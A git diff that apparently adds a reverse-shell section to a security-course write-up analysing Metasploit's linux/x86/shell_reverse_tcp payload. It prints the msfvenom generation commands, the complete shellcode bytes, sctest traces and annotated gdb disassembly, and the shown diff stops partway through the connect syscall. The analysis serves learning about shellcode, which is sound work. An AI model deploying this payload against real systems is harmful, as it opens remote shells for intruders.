@@ -409,10 +409,10 @@ ESP: 0xbffff1b8 --> 0x0
 EIP: 0x40405a --> 0x16a80cd
 EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
 [-------------------------------------code-------------------------------------]
-   0x404053 <code+19>:  pop    ebx
+   0x404053 <code+19>:  pop    ebx     ;filename
    0x404054 <code+20>:  push   0x1b6
-   0x404059 <code+25>:  pop    ecx
-=> 0x40405a <code+26>:  int    0x80
+   0x404059 <code+25>:  pop    ecx     ;mode
+=> 0x40405a <code+26>:  int    0x80    ;syscall
    0x40405c <code+28>:  push   0x1
    0x40405e <code+30>:  pop    eax
    0x40405f <code+31>:  int    0x80
@@ -433,3 +433,203 @@ SYNOPSIS         top
 It takes two arguments, file path and mode. We can see this in our registers above, ```ebx``` holds a pointer to our filename and ```ecx``` holds ```0x1b6``` which is 438 in decimal, which is 666 in octal.
 
 The next part of our shellcode is basically our ```exit()``` function.
+
+## Shellcode 3: linux/x86/shell_reverse_tcp ##
+Let's look at the reverse shell next. For this payload, I'll be using ```sctest``` in order to properly analyse each function. Let's first have a look at the basic options:
+```
+$ msfvenom -p linux/x86/shell/reverse_tcp  --list-options
+Options for payload/linux/x86/shell/reverse_tcp:
+=========================
+
+
+       Name: Linux Command Shell, Reverse TCP Stager
+     Module: payload/linux/x86/shell/reverse_tcp
+   Platform: Linux
+       Arch: x86
+Needs Admin: No
+ Total size: 245
+       Rank: Normal
+
+Provided by:
+    skape <mmiller@hick.org>
+    egypt <egypt@metasploit.com>
+    tkmru
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+LHOST                   yes       The listen address (an interface may be specified)
+LPORT  4444             yes       The listen port
+
+Description:
+  Spawn a command shell (staged). Connect back to the attacker
+```
+This payload takes two arguments, the listener's address and listener's port. Let's analyse how this works.
+
+### Analysis
+Let's run ```sctest``` in order to examine each function that's involved:
+```
+$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 | sctest -v -Ss 100000
+
+...
+int socket (
+     int domain = 2;
+     int type = 1;
+     int protocol = 0;
+) =  14;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 2;
+) =  2;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 1;
+) =  1;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 0;
+) =  0;
+int connect (
+     int sockfd = 14;
+     struct sockaddr_in * serv_addr = 0x00416fbe =>
+         struct   = {
+             short sin_family = 2;
+             unsigned short sin_port = 23569 (port=4444);
+             struct in_addr sin_addr = {
+                 unsigned long s_addr = 16777343 (host=127.0.0.1);
+             };
+             char sin_zero = "       ";
+         };
+     int addrlen = 102;
+) =  0;
+int execve (
+     const char * dateiname = 0x00416fa6 =>
+           = "//bin/sh";
+     const char * argv[] = [
+           = 0x00416f9e =>
+               = 0x00416fa6 =>
+                   = "//bin/sh";
+           = 0x00000000 =>
+             none;
+     ];
+     const char * envp[] = 0x00000000 =>
+         none;
+) =  0;
+```
+So from assignment 2, we have a fair idea of how a reverse shell works. We have four core functions, ```socket()```, ```dup2()```, ```connect()```, and ```execve()```. Let's generate test shellcode, compile ```shellcode.c``` and throw it into ```gdb``` to understand the arguments that go into each function:
+```
+$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c                  
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+Final size of c file: 311 bytes
+unsigned char buf[] =
+"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
+"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
+"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
+"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
+
+paste in shellcode.c, compile
+
+$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
+shellcode.c:8:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
+    8 | main()
+      | ^~~~
+```
+```nasm
+gdb-peda$ disas
+Dump of assembler code for function code:
+=> 0x00404040 <+0>:     xor    ebx,ebx
+   0x00404042 <+2>:     mul    ebx
+   0x00404044 <+4>:     push   ebx
+   0x00404045 <+5>:     inc    ebx
+   0x00404046 <+6>:     push   ebx
+   0x00404047 <+7>:     push   0x2
+   0x00404049 <+9>:     mov    ecx,esp
+   0x0040404b <+11>:    mov    al,0x66
+   0x0040404d <+13>:    int    0x80
+   0x0040404f <+15>:    xchg   ebx,eax
+   0x00404050 <+16>:    pop    ecx
+   0x00404051 <+17>:    mov    al,0x3f
+   0x00404053 <+19>:    int    0x80
+   0x00404055 <+21>:    dec    ecx
+   0x00404056 <+22>:    jns    0x404051 <code+17>
+   0x00404058 <+24>:    push   0x100007f
+   0x0040405d <+29>:    push   0x5c110002
+   0x00404062 <+34>:    mov    ecx,esp
+   0x00404064 <+36>:    mov    al,0x66
+   0x00404066 <+38>:    push   eax
+   0x00404067 <+39>:    push   ecx
+   0x00404068 <+40>:    push   ebx
+   0x00404069 <+41>:    mov    bl,0x3
+   0x0040406b <+43>:    mov    ecx,esp
+   0x0040406d <+45>:    int    0x80
+   0x0040406f <+47>:    push   edx
+   0x00404070 <+48>:    push   0x68732f6e
+   0x00404075 <+53>:    push   0x69622f2f
+   0x0040407a <+58>:    mov    ebx,esp
+   0x0040407c <+60>:    push   edx
+   0x0040407d <+61>:    push   ebx
+   0x0040407e <+62>:    mov    ecx,esp
+   0x00404080 <+64>:    mov    al,0xb
+   0x00404082 <+66>:    int    0x80
+   0x00404084 <+68>:    add    BYTE PTR [eax],al
+End of assembler dump.
+```
+- So there's four different ```int 0x80``` instructions, corresponding to our four functions. Let's set a breakpoint at each in order to understand how each function works. Let's start with the first syscall:
+
+```nasm
+=> 0x00404040 <+0>:     xor    ebx,ebx       ;ebx=0
+   0x00404042 <+2>:     mul    ebx           
+   0x00404044 <+4>:     push   ebx           ;0 --> IPPROTO_IP
+   0x00404045 <+5>:     inc    ebx           ;ebx=1
+   0x00404046 <+6>:     push   ebx           ;1 --> SOCK_STREAM
+   0x00404047 <+7>:     push   0x2           ;2 --> AF_INET
+   0x00404049 <+9>:     mov    ecx,esp       ;pointer to args
+   0x0040404b <+11>:    mov    al,0x66       ;socketcall
+   0x0040404d <+13>:    int    0x80          ;syscall
+```
+This is where our address structure is defined. The ```socket()``` function is called (```ebx=1 --> call to socket()```), with arguments 2, 1 and 0:
+
+- ```AF_INET```: Found in ```/usr/include/bits/socket.h```:
+```c
+#define PF_INET         2       /* IP protocol family.  */
+#define AF_INET         PF_INET
+```
+- ```SOCK_STREAM```: Found in ```/usr/include/bits/socket_type.h```:
+```c
+SOCK_STREAM = 1, /* Sequenced, reliable, connection-based byte streams.  */
+```
+- ```int protocol```: Found in ```/usr/include/linux/in.h```:
+```c
+IPPROTO_IP = 0, /* Dummy protocol for TCP */
+```
+The ```sockfd``` returned is then stored in ```ebx```:
+```nasm
+0x0040404f <+15>:    xchg   ebx,eax
+```
+The second syscall is for ```dup2```:
+```nasm
+0x00404050 <+16>:    pop    ecx                    ;ecx=2 (counter)
+0x00404051 <+17>:    mov    al,0x3f                ;dup2
+0x00404053 <+19>:    int    0x80                   ;syscall
+0x00404055 <+21>:    dec    ecx              
+0x00404056 <+22>:    jns    0x404051 <code+17>     ;loop
+```
+This will duplicate our standard file descriptors ```STDIN```, ```STDOUT``` and ```STDERR```.
+
+The next section of code deals with ```connect()```(```connect(s,2,port,addr,16```)):
+```nasm
+0x00404058 <+24>:    push   0x100007f              ;ip
+0x0040405d <+29>:    push   0x5c110002             ;port
+0x00404062 <+34>:    mov    ecx,esp                ;pointer to args
+0x00404064 <+36>:    mov    al,0x66                ;socketcall
+0x00404066 <+38>:    push   eax                    ;length of addr struct
+0x00404067 <+39>:    push   ecx                    ;ip and port
+0x00404068 <+40>:    push   ebx                    ;sockfd
+0x00404069 <+41>:    mov    bl,0x3                 ;ebx=3 --> connect()
+0x0040406b <+43>:    mov    ecx,esp                ;pointer to args
+0x0040406d <+45>:    int    0x80                   ;syscall
+```
